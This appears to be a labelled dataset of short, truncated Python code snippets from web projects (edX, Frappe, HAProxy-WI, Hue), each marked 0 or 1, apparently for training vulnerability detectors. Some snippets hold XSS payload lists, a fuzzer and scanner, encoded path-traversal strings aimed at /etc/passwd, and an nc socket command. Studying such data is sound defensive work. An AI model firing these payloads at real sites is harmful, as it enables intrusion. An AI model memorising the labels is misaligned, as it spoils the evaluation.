\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore", "label": 0}, {"snippet_id": 22753, "code": "+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 9655, "code": ">[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url", "label": 0}, {"snippet_id": 20352, "code": " if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up", "label": 0}, {"snippet_id": 21343, "code": "/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', ", "label": 1}, {"snippet_id": 30356, "code": ": \t\tprint(\"Http Error:\",errh) \texcept requests.exceptions.ConnectionError as errc: \t\tprint('<div class=\"alert alert-danger\">Error Connecting: %s</div>' % errc) \texcept requests.exceptions.Timeout as errt", "label": 0}, {"snippet_id": 25962, "code": " value.initial=data.get('question_form_data',{}).get(key) class BaseInvoiceAddressForm(forms.ModelForm): vat_warning=False class Meta: model=InvoiceAddress fields=('is_business', 'company', 'name_parts'", "label": 0}, {"snippet_id": 33557, "code": "\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t", "label": 0}, {"snippet_id": 32685, "code": " line.startswith(' md.treeprocessors['adjust_toc']=_AdjustTOC(has_a_single_h1) md_fragment=md.convert(contents).encode('utf-8') try: self._WriteHeader('text/html') self._WriteTemplate('header.html') self", "label": 0}, {"snippet_id": 30335, "code": ".ConnectTimeout: \t\tprint('Oops. Connection timeout occured!') \texcept requests.exceptions.ReadTimeout: \t\tprint('Oops. Read timeout occured') \texcept requests.exceptions.HTTPError as errh: \t\tprint(\"Http", "label": 0}, {"snippet_id": 54081, "code": " method.get()==\"POST\": get=False post=True else: get=True post=True fresh=False if refresh.get()==\"On\": fresh=True ck=None c=cookie.get() if len(c)>0: ck=c for x in crl: if stop==True: break print(\"[*]URL", "label": 0}, {"snippet_id": 8580, "code": "', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^", "label": 0}, {"snippet_id": 30909, "code": "=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" \t\tfunct.get_config(serv, cfg) \telse: \t\tcfg=hap_configs_dir +form.getvalue('configver') \t\t\t \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint", "label": 0}, {"snippet_id": 19866, "code": "('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly", "label": 0}, {"snippet_id": 54957, "code": " project=project).aggregate_stats() def mark_changed_translation(changed_entities, locale): \"\"\"Mark entities as changed, for later sync. \"\"\" changed_entities_array=[] existing=( ChangedEntityLocale.objects", "label": 0}, {"snippet_id": 41173, "code": " \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren", "label": 0}, {"snippet_id": 49038, "code": "[ SmartListField(self, column, self.object) for column in self.smart_list.columns ] class SmartOrder(QueryParamsMixin, object): def __init__(self, query_params, column_id, ordering_query_param): self.query_params", "label": 0}, {"snippet_id": 39586, "code": " _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df): \t\t\tif df.fieldtype==\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t", "label": 0}, {"snippet_id": 41851, "code": " \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t", "label": 0}, {"snippet_id": 35252, "code": "\"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(", "label": 0}, {"snippet_id": 51435, "code": "=True ALLOWED_HOSTS=[] INSTALLED_APPS=[ 'constance', 'constance.backends.database', 'jet.dashboard', 'jet', 'import_export', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes'", "label": 0}, {"snippet_id": 35063, "code": " self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset", "label": 0}, {"snippet_id": 32085, "code": ",) class DeleteMappingsAction(tables.DeleteAction): @staticmethod def action_present(count): return ungettext_lazy( u\"Delete Mapping\", u\"Delete Mappings\", count ) @staticmethod def action_past(count): return", "label": 0}, {"snippet_id": 11449, "code": " ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth", "label": 0}, {"snippet_id": 24103, "code": " class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp", "label": 0}, {"snippet_id": 19948, "code": "(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly):", "label": 0}, {"snippet_id": 31827, "code": "\ttry: \t\twith open(list, \"w\") as file: \t\t\tfile.write(form.getvalue('bwlists_content')) \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color'", "label": 0}, {"snippet_id": 11872, "code": ".redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key=", "label": 0}, {"snippet_id": 32584, "code": ") elif not os.path.exists(full_path): self._DoNotFound() elif path.lower().endswith('.md'): self._DoMD(path) elif os.path.exists(full_path +'/README.md'): self._DoMD(path +'/README.md') elif path.lower", "label": 0}, {"snippet_id": 41115, "code": "\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t", "label": 0}, {"snippet_id": 9890, "code": " settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns", "label": 0}, {"snippet_id": 34451, "code": "\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self, key): \t\tif key in self.__dict__: \t\t\tdel self.__dict__[key] \tdef append(self, key, value=None): \t\tif value==None: \t\t\tvalue", "label": 0}, {"snippet_id": 32854, "code": "/body>' '</html>' % self.path) def _DoDirListing(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write('<div class=\"Breadcrumbs", "label": 0}, {"snippet_id": 9875, "code": " ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ", "label": 0}, {"snippet_id": 32057, "code": ",) icon=\"plus\" policy_rules=((\"identity\", \"identity:create_mapping\"),) class EditMappingLink(tables.LinkAction): name=\"edit\" verbose_name=_(\"Edit\") url=\"horizon:identity:mappings:update\" classes=(\"ajax", "label": 0}, {"snippet_id": 41749, "code": "\tif key in d: \t\t\t\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict", "label": 0}, {"snippet_id": 30886, "code": "(stdout=output)\t \t \tprint(template) \tprint(stderr) \t if serv is not None and act==\"configShow\": \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \t \tif form.getvalue('configver')", "label": 0}, {"snippet_id": 47406, "code": "/admin/media/select?action_url=/admin/actions/change-user-avatar' '&payload=' +str(user_id) +'\"><img class=\"button-img\" alt=\"Change avatar\" ' 'src=\"/staticfiles/frontpage/change-avatar.png\"/></a><br />')", "label": 0}, {"snippet_id": 21488, "code": " name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$", "label": 0}, {"snippet_id": 43792, "code": " in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, ", "label": 0}, {"snippet_id": 29602, "code": " \t\telif kwargs.get('retunr_err')==1: \t\t\treturn stderr.read().decode(encoding='UTF-8') \t\telse: \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): ", "label": 0}, {"snippet_id": 32497, "code": "'([-_])[-_]+', r'\\1', value) return value class Server(SocketServer.TCPServer): def __init__(self, server_address, top_level): SocketServer.TCPServer.__init__(self, server_address, Handler) self.top_level", "label": 0}, {"snippet_id": 54664, "code": "'pk': self.object.pk}) def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['comments']=self.object.comment_set.all().order_by('-time') context['form']=self.get_form()", "label": 0}, {"snippet_id": 38344, "code": ".name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s", "label": 0}, {"snippet_id": 53076, "code": "'oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if", "label": 0}, {"snippet_id": 13043, "code": ", url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user", "label": 0}, {"snippet_id": 2265, "code": " xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?", "label": 0}, {"snippet_id": 50799, "code": "=options.get(\"ansi\", flags.get('ANSI', True)) nocolor=options.get(\"nocolor\", flags.get(\"NOCOLOR\") or not(xterm256 or useansi)) screenreader=options.get(\"screenreader\", flags.get(\"SCREENREADER\", False))", "label": 0}, {"snippet_id": 27138, "code": " hidden_param_name, hidden_param_value, form_counter, url) params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" if has_form==1: m_input=re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re", "label": 1}, {"snippet_id": 44148, "code": " exploit&lt;& \"\"\".strip() hits=results.hits.hits assert len(hits)==1 inner_hits=hits[0]['inner_hits'] domain_hits=inner_hits['domains']['hits']['hits'] assert len(domain_hits)==0 section_hits=inner_hits[", "label": 1}, {"snippet_id": 7370, "code": "'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create", "label": 0}, {"snippet_id": 4725, "code": "'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', ", "label": 0}, {"snippet_id": 43659, "code": " \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated", "label": 0}, {"snippet_id": 44089, "code": "{ 'project': TermsFacet(field='project'), 'version': TermsFacet(field='version') } def query(self, search, query): \"\"\" Add query part to ``search`` Overriding because we pass ES Query object instead of", "label": 0}, {"snippet_id": 38929, "code": "(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype", "label": 0}, {"snippet_id": 13322, "code": "+=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views", "label": 0}, {"snippet_id": 20800, "code": ".password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls'", "label": 0}, {"snippet_id": 3548, "code": "=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request", "label": 0}, {"snippet_id": 2258, "code": " try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme", "label": 0}, {"snippet_id": 54629, "code": "', 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return queryset class ArticleDetail(DetailView, FormMixin): \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002 \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002 \"\"\" model=Article context_object_name", "label": 1}, {"snippet_id": 5097, "code": "(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self, url=\"\"): \"\"\"", "label": 0}, {"snippet_id": 44644, "code": ".dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields()", "label": 0}, {"snippet_id": 51126, "code": " if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: return obj.schedule.remaining_estimate(last_run_at=datetime.now(pytz.utc)) @staticmethod def next(obj): if", "label": 0}, {"snippet_id": 38750, "code": "\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse", "label": 0}, {"snippet_id": 39037, "code": "=\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt", "label": 0}, {"snippet_id": 54214, "code": "\",background='light sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue').grid(row=6) Label(main, text=\"Refresh:\",background='light sky blue').grid(row=7) Label(main, text=", "label": 0}, {"snippet_id": 2769, "code": "(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True", "label": 0}, {"snippet_id": 29515, "code": ">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint(line) \t\t def server_status(stdout):\t \tproc_count=\"\" \t \tfor line in stdout: \t\tif \"Ncat: \" not in line: \t\t\tfor k in line", "label": 0}, {"snippet_id": 51647, "code": "'OPTIONS': DATABASE_OPTIONS.get(os.environ.get('DB_ENGINE', 'mysql'),{}) } } DATABASE=os.environ.get('DJANGO_DATABASE', 'dev') DATABASES={'default': DATABASES_SETTINGS[DATABASE]} AUTH_PASSWORD_VALIDATORS=[ { ", "label": 0}, {"snippet_id": 30581, "code": ", grep_act, grep) \telse: \t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) ", "label": 0}, {"snippet_id": 27383, "code": "=obj.key.id() return dict_obj elif isinstance(obj, datetime.datetime): return int((obj -self._EPOCH).total_seconds()) elif hasattr(obj, 'to_dict'): return obj.to_dict() elif isinstance(obj, cgi.FieldStorage", "label": 0}, {"snippet_id": 14906, "code": "\" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes", "label": 0}, {"snippet_id": 4495, "code": " fuzzUnicode(cnt=1): for i in xrange(cnt): yield unichr(random.randint(0, 0xffff)) @staticmethod def fuzzUnicodeReplace(s, cnt=1): s=s.replace(\"A\", \"\u0100\", cnt) s=s.replace(\"A\", \"\u0102\", cnt) s=s.replace(\"A\", \"\u0104\", cnt)", "label": 0}, {"snippet_id": 27166, "code": "*value=\"(\\w+)\"', line, re.M|re.I) if m_value: hidden_param_name.append(m_input.group(2)) hidden_param_value.append(m_value.group(2)) else: params.append(m_input.group(2)) m_same =re.match(r'.*\\<form\\>\"'", "label": 1}, {"snippet_id": 5751, "code": "\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>'", "label": 0}, {"snippet_id": 21014, "code": ".html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name", "label": 0}, {"snippet_id": 21184, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name", "label": 0}, {"snippet_id": 38139, "code": ".title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), ", "label": 1}, {"snippet_id": 37563, "code": "\treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog", "label": 0}, {"snippet_id": 457, "code": "+payload,\"GET\",headers) logs.logging.info(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers", "label": 1}, {"snippet_id": 1308, "code": " return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data[", "label": 0}, {"snippet_id": 31455, "code": ".line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\" \t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\" \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location", "label": 0}, {"snippet_id": 18539, "code": "'staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 4869, "code": " content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw", "label": 1}, {"snippet_id": 47051, "code": " FilterConverter from invenio_db import db from markupsafe import Markup from sqlalchemy.exc import SQLAlchemyError from.api import Record from.models import RecordMetadata class RecordMetadataModelView(ModelView): ", "label": 0}, {"snippet_id": 10469, "code": ".stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains", "label": 0}, {"snippet_id": 6199, "code": " function. Number of threads should probably be about 2x number of cores to 4x number of cores(if hyperthreading is available). \"\"\" return self.config.getint(self.section, 'num_threads') @property def logdir", "label": 0}, {"snippet_id": 29811, "code": ".exit() if form.getvalue('token') is None: \tprint(\"What the fuck?! U r hacker Oo?!\") \tsys.exit() \t\t if form.getvalue('getcerts') is not None and serv is not None: \tcert_path=sql.get_setting('cert_path') ", "label": 0}, {"snippet_id": 38683, "code": " self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default", "label": 0}, {"snippet_id": 26581, "code": "/../../../../etc/passwd%00', '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 29209, "code": "\"echo 'show info' |nc %s %s |grep Version |awk '{print $2}'\" %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in output: \t\tver=line \treturn ver \t def upload(serv, path, file, *", "label": 0}, {"snippet_id": 36101, "code": " field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t", "label": 0}, {"snippet_id": 38534, "code": "(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \"", "label": 0}, {"snippet_id": 17027, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems", "label": 0}, {"snippet_id": 35853, "code": ".get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t", "label": 0}, {"snippet_id": 13064, "code": "=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student", "label": 0}, {"snippet_id": 52372, "code": "-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows=[node['properties']", "label": 0}, {"snippet_id": 9051, "code": "', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views", "label": 0}, {"snippet_id": 7679, "code": "[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses", "label": 1}, {"snippet_id": 10680, "code": ") and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft", "label": 0}, {"snippet_id": 5010, "code": " '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>' ] _h5payloads=[ '<form id=\"test\"></form><button form=\"test\" formaction", "label": 0}, {"snippet_id": 9608, "code": ", ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 32399, "code": " _open_url(url): time.sleep(1) webbrowser.open(url) def _gitiles_slugify(value, _separator): \"\"\"Convert a string(representing a section title) to URL anchor name. This function is passed to \"toc\" extension", "label": 0}, {"snippet_id": 11214, "code": ".log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self", "label": 0}, {"snippet_id": 478, "code": "(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\"", "label": 1}, {"snippet_id": 39808, "code": "'.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype", "label": 0}, {"snippet_id": 17007, "code": "/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading", "label": 0}, {"snippet_id": 38536, "code": " doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-", "label": 0}, {"snippet_id": 17739, "code": " name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,", "label": 0}, {"snippet_id": 10006, "code": ") class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be", "label": 1}, {"snippet_id": 22661, "code": ", name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id", "label": 0}, {"snippet_id": 26043, "code": ".validate_vat_id=kwargs.pop('validate_vat_id') self.all_optional=kwargs.pop('all_optional', False) super().__init__(*args, **kwargs) if not event.settings.invoice_address_vatid: del self.fields['vat_id'] if not event", "label": 0}, {"snippet_id": 38650, "code": " key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\",", "label": 0}, {"snippet_id": 43727, "code": " Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be", "label": 0}, {"snippet_id": 737, "code": "(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is", "label": 1}, {"snippet_id": 28407, "code": ">' %(sec, var)) \t\t\t\t\t def get_data(type): \tfrom datetime import datetime \tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'))) \tif type=='config': 